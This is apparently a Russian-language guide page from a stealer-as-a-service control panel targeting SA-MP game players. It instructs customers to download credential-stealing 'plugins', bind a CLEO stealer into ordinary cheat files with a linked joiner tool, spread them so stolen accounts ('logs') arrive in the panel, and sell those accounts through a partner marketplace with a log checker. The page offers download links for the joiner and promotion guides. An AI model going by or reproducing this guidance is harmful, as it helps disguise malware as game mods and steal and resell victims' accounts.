            ...
            <nav class="navbar navbar-expand-lg justify-content-between">
                ...
                <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
                    <div class="navbar-nav">
                        ...
                        <a class="nav-item nav-link active" href="/gides">
                          Гайды
                          <span id="line" style="background-color: #176091; box-shadow: 0px 3px 14px rgba(95,111,203,24);"></span>
                        </a>
        ...
        <div class="container lk-container">
            <div class="row">
                ...
                <div class="main_lk col-md-9">
                    ...
                    <h2>Что такое панель управления?</h2>
                    <div class="stats_panel">
                        <p>После покупки и активации ключа - вы попадаете в личный кабинет - это и есть ваша панель управления. В ней вы можете скачать ваши плагины. После пиара ваших плагинов, в вашу панель будут поступать логи (аккаунты). Также в вашей панели управления доступны функции - смены логина/пароля, привязки аккаунта Вконтакте, настройки логов (отключить повторы, ненужные диалоги или нубо-рп сервера) и другое, просто нажмите на шестеренку в верхнем правом углу.</p>
                    </div>

                    <h2>КАК СКАЧАТЬ СТИЛЛЕРЫ (ПЛАГИНЫ)?</h2>
                    <div class="stats_panel">
                        <p>Для того, чтобы скачать плагины, в личном кабинете найдите кнопку на ораньжевой панели - "Скачать плагины".</p>
                    </div>

                    <h2>КАК ПОЛУЧАТЬ ЛОГИ В ПАНЕЛЬ?</h2>
                    <div class="stats_panel">
                        <p>Для того, чтобы получать логи (аккаунты) в вашу панель управления, необходимо пиарить ваши плагины. Ниже мы представили небольшой гайд со способами, как это можно сделать.</p>
                    </div>
                    

                    <h2>КАК СКЛЕИТЬ CLEO СТИЛЛЕР?</h2>
                    <div class="stats_panel">
                        <p>Для того, чтобы склеить ваш клео стиллер с любым клео читом, вам понадобиться специальный Connector by Mogaika. Скачать его можно по кнопке ниже. Далее все очень просто. Выделяем два клео файла и перетаскиваем на ярлык программы, после чего она запуститься и вы получите третий файл.</p>
                        <a href="http://stealprod.ru/download_files/connector.exe" class="btn-main">Загрузить склейщик</a>
                    </div>

                    <h2>КАК РАСШИФРОВЫВАЮТЯ ID ДИАЛОГОВ?</h2>
                    <div class="stats_panel">
                        <p>Каждый номер диалога имеет своё значение. Мы собрали для вас значения часто встречающихся диалогов и поместили в файл txt.</p>
                        <a href="http://stealprod.ru/download_files/id.txt" class="btn-main">Скачать расшифровки ID диалогов</a>
                    </div>

                    <h2>КАК ПРОПИАРИТЬ СВОЮ ПАНЕЛЬ?</h2>
                    <div class="stats_panel">
                        <p>На сегодняшний день - пиар панели управления не составляет как таковой сложности. Вы можете воспользоваться услугой пиарщиков, например - Роман Фермин , или же попробовать самому. Мы предоставляем вам некоторый гайд, который вы можете скачать, перейдя по этой ссылке.</p>
                        <a href="http://stealprod.ru/download_files/pr.txt" class="btn-main">Скачать гайд по пиару</a>
                    </div>

                    <h2>КАК ПОЛУЧИТЬ БЕСПЛАТНЫЙ ЧЕКЕР ЛОГОВ И ПРОДАВАТЬ АККАУНТЫ?</h2>
                    <div class="stats_panel">
                        <p>Вы также можете получить бесплатный чекер логов от нашего партнера - торговой площадки SAMP-STORE, для этого вам необходимо пройти регистрацию, а далее в боком меню найти пункт - Чекер логов. Также на ней, вы можете легко и быстро реализовывать ваши аккаунты, выводя деньги на удобный вам кошелек.</p>
    ...
    <div class="modal-wrapper dl__steal">
        <div class="modal-content-wrapper">
            ...
            <div class="modal-content">
				...
				<? } if ($lua == 1) { ?>
                    <a class="a-button" href="/php/download.php?file=plugin&format=lua1" target="_blank">Скачать LUA (w/o DP)</a>
